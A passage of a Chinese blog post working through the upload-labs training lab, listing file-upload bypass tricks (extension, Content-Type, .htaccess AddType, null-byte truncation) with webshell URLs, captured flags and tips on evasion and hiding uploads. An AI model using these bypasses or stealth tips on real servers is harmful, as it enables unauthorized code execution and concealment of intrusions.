@@ -1,0 +1,432 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer-when-downgrade"><title>upload-labs上传漏洞利用笔记 | 老麦的书房</title><meta property="og:title" content="upload-labs上传漏洞利用笔记 - 老麦的书房"><meta property="og:type" content="article"><meta property="article:published_time" content="2020-12-23T00:00:00+08:00"><meta property="article:modified_time" content="2020-12-23T00:00:00+08:00"><meta name=Keywords content="[安全]"><meta name=description content="upload-labs上传漏洞利用笔记"><meta name=author content="老麦"><meta property="og:url" content="https://tangx.in/posts/2020/12/23/upload-labs/"><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link rel=stylesheet href=/css/normalize.css><link rel=stylesheet href=/css/style.css><script type=text/javascript src=//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js></script></head><body><header id=header class=clearfix><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5359126171348711" crossorigin=anonymous></script><div class=container><div class=col-group><div class=site-name><a id=logo href=https://tangx.in/>老麦的书房</a><p class=description>Go语言(golang)、 云原生、 DevOps、 可视化追踪。 React 入门。</p></div><div><nav id=nav-menu class=clearfix><a class=current href=https://tangx.in/>首页</a>
+<a href=https://tangx.in/books/ title=书柜>书柜</a>
+<a href=https://tangx.in/categories/ title=分类>分类</a>
+<a href=https://tangx.in/tags/ title=标签>标签</a>
+<a href=https://tangx.in/links/ title=友链>友链</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><style type=text/css>.post-toc{position:fixed;width:200px;margin-left:-210px;padding:5px 10px;font-family:Athelas,STHeiti,Microsoft Yahei,serif;font-size:12px;border:1px solid rgba(0,0,0,7%);border-radius:5px;background-color:rgba(255,255,255,.98);background-clip:padding-box;-webkit-box-shadow:1px 1px 2px rgba(0,0,0,.125);box-shadow:1px 1px 2px rgba(0,0,0,.125);word-wrap:break-word;white-space:nowrap;-webkit-box-sizing:border-box;box-sizing:border-box;z-index:999;cursor:pointer;max-height:70%;overflow-y:auto;overflow-x:hidden}.post-toc .post-toc-title{width:100%;margin:0 auto;font-size:20px;font-weight:400;text-transform:uppercase;text-align:center}.post-toc .post-toc-content{font-size:15px}.post-toc .post-toc-content>nav>ul{margin:10px 0}.post-toc .post-toc-content ul{padding-left:20px;list-style:square;margin:.5em;line-height:1.8em}.post-toc .post-toc-content ul ul{padding-left:15px;display:none}@media print,screen and (max-width:1057px){.post-toc{display:none}}</style><div class=post-toc style=position:absolute;top:188px><h2 class=post-toc-title>文章目录</h2><div class=post-toc-content><nav id=TableOfContents><ul><li><a href=#pass-01-前端验证绕过>pass-01 前端验证绕过</a></li><li><a href=#pass-02-content-type方式绕过>pass-02 Content-Type方式绕过</a></li><li><a href=#pass-03--黑名单绕过>pass-03 黑名单绕过</a></li><li><a href=#pass-04-htaccess文件绕过>pass-04 <code>.htaccess</code>文件绕过</a></li><li><a href=#pass-05-后缀大小写绕过>pass-05 后缀大小写绕过</a></li><li><a href=#pass-06-文件后缀空绕过>pass-06 文件后缀（空）绕过</a></li><li><a href=#pass-07--文件后缀点绕过>pass-07 文件后缀(点)绕过</a></li><li><a href=#pass-08-datawindows文件流绕过>pass-08 <code>::$DATA（Windows文件流绕过</code></a></li><li><a href=#pass-09-构造文件后缀绕过>pass-09 构造文件后缀绕过</a></li><li><a href=#10-双写文件后缀绕过>10 双写文件后缀绕过</a></li><li><a href=#11-00-截断绕过>11 <code>%00</code> 截断绕过</a></li><li><a href=#12-00截断绕过二>12. %00截断绕过(二)</a></li><li><a href=#13-图片马绕过>13. 图片马绕过</a></li><li><a href=#14-getimagesize图片类型绕过>14. getimagesize图片类型绕过</a></li><li><a href=#15-php_exif模块图片类型绕过>15. php_exif模块图片类型绕过</a></li><li><a href=#16-二次渲染绕过>16 二次渲染绕过</a><ul><li><a href=#二次上传利用-坑>二次上传利用 （坑）</a></li><li><a href=#gif-制马>gif 制马</a></li><li><a href=#flag>flag</a></li></ul></li><li><a href=#17-文件竞争>17 文件竞争</a></li><li><a href=#18-条件竞争2>18. 条件竞争2</a></li><li><a href=#19-move_uploaded_file-截断>19 <code>move_uploaded_file()</code> 截断</a></li><li><a href=#20---iis60解析漏洞一>20 . IIS6.0解析漏洞（一）</a></li><li><a href=#21-iis60-解析漏洞二>21. IIS6.0 解析漏洞（二）</a></li><li><a href=#21-iis60-解析漏洞三>21. IIS6.0 解析漏洞（三）</a></li><li><a href=#22-cgi-漏洞>22. CGI 漏洞</a></li></ul></nav></div></div><script type=text/javascript>$(document).ready(function(){if(e=$(".post-toc"),e.length){t=$("#main").offset().left,t<220&&e.css({width:t-10,"margin-left":0-t});var e,t,n=e.offset().top-20,s={start:{position:"absolute",top:n},process:{position:"fixed",top:20}};$(window).scroll(function(){var t=$(window).scrollTop();t<n?e.css(s.start):e.css(s.process)})}$("#TableOfContents").children().length<1&&$(".post-toc").remove()})</script><article class=post><header><h1 class=post-title>upload-labs上传漏洞利用笔记</h1></header><time datetime=2020-12-23T00:00:00Z class="post-meta meta-date dt-published">2020年12月23日</time><div class=post-meta><span id=busuanzi_container_page_pv>&nbsp;|
+<span id=busuanzi_value_page_pv></span> <span>阅读</span></span></div><div class=post-content><h1 id=文件上传漏洞>文件上传漏洞</h1><p>http://59.63.200.79:8016/Pass-01/index.php</p><ol><li>配置 burpsuite， 开启response 拦截</li></ol><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/e5669b1869b679fee347566f647c0f82_92611.png></p><h2 id=pass-01-前端验证绕过>pass-01 前端验证绕过</h2><p>核心思想： 拦截 response ， 删除前端功能模块。</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/0b87b7f91468f05433eda0e5e17c9bbc_80856.png></p><p>拦截 response。 删除 96 行以后的 js 模块， 并放行。 获取图片地址， 使用 蚁剑 连接</p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-01/upload/webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_kezZYqSU.txt : zkaq{PpsG@-cImaU2cahL}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-02-content-type方式绕过>pass-02 Content-Type方式绕过</h2><p>上传，拦截，抓包，修改 <code>content-type: text/php</code> 为 <code>content-type: image/jpeg</code></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/86eb4970156629eadaba90d0db182eb2_14762.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-02/upload/webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_qzdoouIu.txt: zkaq{2jzVjQeRV_EfuA-+}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-03--黑名单绕过>pass-03 黑名单绕过</h2><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:teal>$deny_ext</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#000;font-weight:700>array</span>(<span style=color:#d14>&#39;.asp&#39;</span>,<span style=color:#d14>&#39;.aspx&#39;</span>,<span style=color:#d14>&#39;.php&#39;</span>,<span style=color:#d14>&#39;.jsp&#39;</span>);
+</span></span></code></pre></td></tr></table></div></div><p>分析源码， 仅限制了常见后缀。 而， php 还有其他默认带版本的解析后缀。</p><p>例如：</p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>pht，phpt，phtml，php3，php4，php5，php6
+</span></span></code></pre></td></tr></table></div></div><ul><li>参考:
+<a href=https://www.freebuf.com/articles/web/179954.html target=_blank rel=noopener>文件上传限制绕过技巧</a></li></ul><p>这里使用 <code>webshell.php5</code></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/962c993e227d8ae0e8eb268b4fb29043_30754.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-03/upload//webshell.php5
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_SiZPRmH1.txt: zkaq{lapc=@Hs1EXxqwif}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-04-htaccess文件绕过>pass-04 <code>.htaccess</code>文件绕过</h2><p><code>.htaccess</code> 是 apache 用来管理目录权限的<strong>动态文件</strong>， 可以实现目录的<strong>黑白名单</strong>， <strong>伪静态</strong>， <strong>默认解析器</strong> 等。
+同样，在 nginx 中也可以使用， 不过需要手动引入。</p><ul><li><a href=https://cloud.tencent.com/developer/article/1389181 target=_blank rel=noopener>Linux下nginx支持.htaccess文件实现伪静态的方法</a></li></ul><p>当过滤规则无法绕过的时候，可以尝试优先上传一个 <code>.htaccess</code> <strong>设置</strong>某类<strong>图片文件</strong> 的<strong>默认解释器</strong>。</p><ul><li><a href=https://blog.csdn.net/cxrpty/article/details/104358473 target=_blank rel=noopener>.htaccess文件解析漏洞</a></li></ul><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:teal>AddType application/x-httpd-php .jpg</span>
+</span></span></code></pre></td></tr></table></div></div><p><strong>1. 上传 <code>.htaccess</code></strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/32f674bb21af92be9d761443624bef34_11891.png></p><p><strong>2. 上传 jpg 后缀的 php 文件</strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/779723364afed82af9633a54e9df3701_39046.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-04/upload/webshell.jpg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_x=$ioleC.txt : zkaq{lgevqWqnexX2hy-a}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-05-后缀大小写绕过>pass-05 后缀大小写绕过</h2><p>分析源码， 黑名单后缀通过 枚举 方式列出， 但未转换为小写进行二次比较， 因此出现利用方式</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/0c4d3a1a00bf66958c95442f899f10ee_84528.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-05/upload//webshell.pHP
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_Pc8u31bi.txt : zkaq{HBkYvhSTYnXLkY@1}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-06-文件后缀空绕过>pass-06 文件后缀（空）绕过</h2><p><strong>文件后缀（空）绕过</strong> 利用的是文件上传后，</p><ol><li>未对文件名进行 <strong>trim</strong> 首尾去空进行判断。</li><li>文件存储时，windows 操作系统首尾去空特性</li></ol><blockquote><p>此法在 linux 上可能不可行。</p></blockquote><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#998;font-style:italic># touch &#34;1.sh &#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># ls -al</span>
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#099>1</span> root root    <span style=color:#099>0</span> Dec <span style=color:#099>22</span> 23:24 <span style=color:#d14>&#39;1.sh &#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/57ac64767c8a6c19054cec9654fe8182_55925.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-06/upload//webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_CEHAWzRh.txt : zkaq{fTHte#S@+5n1B+UF}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-07--文件后缀点绕过>pass-07 文件后缀(点)绕过</h2><p><strong>文件后缀点</strong> 利用逻辑与 <strong>文件后缀空</strong> 类似。 windows 将忽略点。</p><blockquote><p>主要原因是windows等系统默认删除文件后缀的.和空格，查看网站源码发现，没有过滤点。</p></blockquote><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/d9542087482d80b0281d0a8713a34350_45914.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-07/upload//webshell.php.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_aLiyOhNR.txt : zkaq{2hd2JY3@F7VNMY8W}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-08-datawindows文件流绕过>pass-08 <code>::$DATA（Windows文件流绕过</code></h2><p><code>::$DATA</code> 是 windows 特有的绕过漏洞， 利用的是windows 存储机制。</p><ul><li>参考文档:
+<a href=https://xz.aliyun.com/t/2539 target=_blank rel=noopener>渗透测试的WINDOWS NTFS技巧集合</a></li></ul><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/f64be0a0a3ba95c880463c45c0adb77b_42939.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-08/upload//webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_m=aH$ViC.txt : zkaq{n5zP@kZia7%dSPP1}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pass-09-构造文件后缀绕过>pass-09 构造文件后缀绕过</h2><p>又名 <strong>点空点</strong> 绕过。 认真分析代码，</p><ol><li>先去除了<strong>点</strong></li><li>再去除了<strong>空</strong></li><li>只执行了一次。</li></ol><p>因此， 可以复写 <strong>点空</strong> 进行绕过。</p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-09/upload//webshell.php.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_%#B_SfdG.txt : zkaq{1+U=Tl=%AKS-juZ5}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=10-双写文件后缀绕过>10 双写文件后缀绕过</h2><p>代码删除了后缀名中的黑名单字段。 <strong>但只执行了一次</strong>， 没有进行多次校验。
+利用逻辑与 <strong>点空点</strong> 相似。</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/c95ebdb2f1945216e084fd81ec41d901_95051.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-10/upload//webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_Wzs%7OQt.txt : zkaq{7aYaRs8IN+9pP=rx}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=11-00-截断绕过>11 <code>%00</code> 截断绕过</h2><p><code>%00</code> 阶段是 php 低版本 5.3.x 中的一个漏洞。 当 PHP 在 <strong>URL</strong> 中遇到 <strong>%00</strong> 时， 会认为语句结束而抛弃后面的语句。</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/fffa81ad849ff1b566ae69e5f8231c2b_83169.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/upload/webshell.php%EF%BF%BD/2520201222235046.jpg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># 可利用</span>
+</span></span><span style=display:flex><span>http://59.63.200.79:8016/upload/webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_bNiqD%LB.txt : zkaq{E9JvKGkwMNLDpZRm}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=12-00截断绕过二>12. %00截断绕过(二)</h2><p>当 <strong>存储路径</strong> 不在 URL 中时， 需要使用 二进制 <strong>00</strong> 阶段</p><p><strong>1. 篡改上传路径， 并多写一个字符 a</strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/9779a352328211cc4896ed99b2002841_40928.png></p><p><strong>2. 使用 hex 工具，将 a 修改为 00</strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/a8a9ac738678833aff0384a4c2a7160d_19475.png></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/upload/webshell.php%EF%BF%BD/3820201222235447.jpg
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># 可利用</span>
+</span></span><span style=display:flex><span>http://59.63.200.79:8016/upload/webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_UZ3F-eeb.txt : zkaq{hx5JQH@+OkI_5Fiv}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=13-图片马绕过>13. 图片马绕过</h2><p>图片马<strong>制作和利用</strong>需要注意的几个事项</p><p><strong>1. 制作</strong></p><ol><li>免杀。</li><li>不要破坏图片显示效果。</li><li>图片大小要符合使用逻辑。</li><li>如果渗透语句放在中后段，注意图片不要太大， 避免<strong>解释器</strong>无法读取</li></ol><p><strong>2.利用</strong></p><ol><li>配合其他漏洞渗透利用， 如解析漏洞。</li><li>注意修改上传时间，避免被发现。</li><li>隐藏母马。</li></ol><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
